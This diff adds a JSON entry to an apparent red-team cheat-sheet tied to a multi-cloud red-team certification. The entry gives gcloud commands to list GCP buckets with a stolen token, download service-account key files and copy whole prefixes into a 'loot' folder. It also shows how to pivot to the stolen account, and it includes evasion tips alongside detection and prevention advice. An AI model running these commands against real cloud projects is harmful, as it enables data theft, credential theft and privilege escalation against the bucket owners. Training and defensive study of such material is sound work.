@@ -1,0 +1,93 @@
+{
+  "id": "gcp-storage-exfil",
+  "name": "GCP Cloud Storage Enumeration & Exfiltration",
+  "command": "gcloud storage ls gs://<bucket> --access-token-file token.txt",
+  "description": "Enumerate and pull objects from Cloud Storage buckets with a stolen token or SA. Buckets frequently hold secrets - service-account key files, .env, terraform state, backups - so this both exfiltrates data and often yields fresh, more-privileged credentials to pivot with.",
+  "type": "command",
+  "platform": "multi",
+  "requires": [
+    "credentials"
+  ],
+  "tools": [
+    "gcloud"
+  ],
+  "tags": [
+    "gcp",
+    "cloud-storage",
+    "exfiltration",
+    "service-account-key",
+    "secrets",
+    "mcrta"
+  ],
+  "category": "Enumeration",
+  "subcategory": "Cloud - GCP",
+  "certifications": [
+    "MCRTA"
+  ],
+  "primary_cert": "MCRTA",
+  "source": "MCRTA (CyberWarFare Labs) - Multi-Cloud Red Team Analyst: GCP",
+  "examples": [
+    {
+      "label": "List buckets, then objects",
+      "command": "gcloud storage ls --access-token-file token.txt\ngcloud storage ls gs://<bucket> --access-token-file token.txt"
+    },
+    {
+      "label": "Download a leaked SA key from a bucket",
+      "command": "gcloud storage cp gs://<bucket>/<sa_key>.json . --access-token-file token.txt"
+    },
+    {
+      "label": "Pivot: authenticate as the exfiltrated SA",
+      "command": "gcloud auth activate-service-account --key-file <sa_key>.json\ngcloud projects get-iam-policy <project_id> --flatten=\"bindings[].members\" --filter=\"bindings.members=serviceAccount:<sa_email>\" --format=\"value(bindings.role)\""
+    },
+    {
+      "label": "Recursively grab a whole prefix",
+      "command": "gcloud storage cp -r gs://<bucket>/<prefix> ./loot --access-token-file token.txt"
+    }
+  ],
+  "notes": "Storage is where cloud credentials leak. Classic MCRTA chain: compute metadata token -> list storage -> find gs://devops-*/...-srvacc-key.json -> download -> activate that (more privileged) SA -> repeat get-iam-policy to find the next hop. Also look for terraform.tfstate (contains secrets), .env, backups, CI artifacts. Public buckets (allUsers/allAuthenticatedUsers) can be read with no creds at all. Use --access-token-file to operate with a stolen token without a full gcloud login.",
+  "references": [
+    {
+      "title": "CyberWarFare Labs - MCRTA",
+      "url": "https://cyberwarfare.live/product/multi-cloud-red-team-analyst-mcrta/"
+    },
+    {
+      "title": "Google Cloud - gcloud storage",
+      "url": "https://cloud.google.com/sdk/gcloud/reference/storage"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "gcp-authentication",
+      "rel": "next",
+      "note": "Activate an exfiltrated SA key to pivot"
+    },
+    {
+      "id": "gcp-iam-privesc",
+      "rel": "next",
+      "note": "Escalate with the newly obtained SA"
+    }
+  ],
+  "opsec": "loud",
+  "exam": "exam-ok",
+  "mitre": [
+    "T1530",
+    "T1552.001"
+  ],
+  "defense": {
+    "why_it_works": "Any identity with storage.objects.list/get on a bucket can read its contents. Because teams routinely store SA key files, IaC state, and .env secrets in buckets - and sometimes grant allUsers/allAuthenticatedUsers - a token or SA with storage access yields both data and fresh, often more-privileged credentials.",
+    "prerequisites": "A credential/token with storage.buckets.list and storage.objects.get/list (or a public bucket for unauthenticated read).",
+    "impact": "T1530 Data from Cloud Storage Object + T1552.001 Unsecured Credentials: Credentials In Files. Data exfiltration plus credential pivots (leaked SA keys) that escalate access.",
+    "detection": "Cloud Audit Logs (Data Access) on storage.objects.get/list - large or unusual read volume, downloads of key/secret files, access from new principals/IPs. SCC public-bucket findings.",
+    "artifacts": "Storage Data Access log entries (objects.get/list); egress of key/tfstate/.env objects.",
+    "prevention": "Never store SA keys/secrets in buckets - use Secret Manager + Workload Identity. Enforce uniform bucket-level access + least-privilege IAM; remove allUsers/allAuthenticatedUsers; enable Data Access logs; VPC Service Controls to stop exfil to external projects; DLP scans for secrets in buckets.",
+    "evasion": "Target specific known object paths rather than listing everything; download during business hours; use the SA that normally accesses the bucket.",
+    "sources": [
+      "MCRTA GCP",
+      "https://attack.mitre.org/techniques/T1530/",
+      "https://attack.mitre.org/techniques/T1552/001/"
+    ],
+    "misconfiguration": "SA keys / terraform state / .env stored in buckets; public (allUsers) buckets; overly broad storage roles; Data Access logs off.",
+    "vulnerable_config": "# Over-privileged token can list + pull a key file:\ngcloud storage cp gs://devops-bucket/devops-srvacc-key.json . --access-token-file token.txt",
+    "secure_config": "# Store secrets in Secret Manager, not buckets; enforce uniform bucket-level access + least privilege;\n# remove public bindings; enable Data Access audit logs; apply VPC Service Controls; run DLP on buckets."
+  }
+}
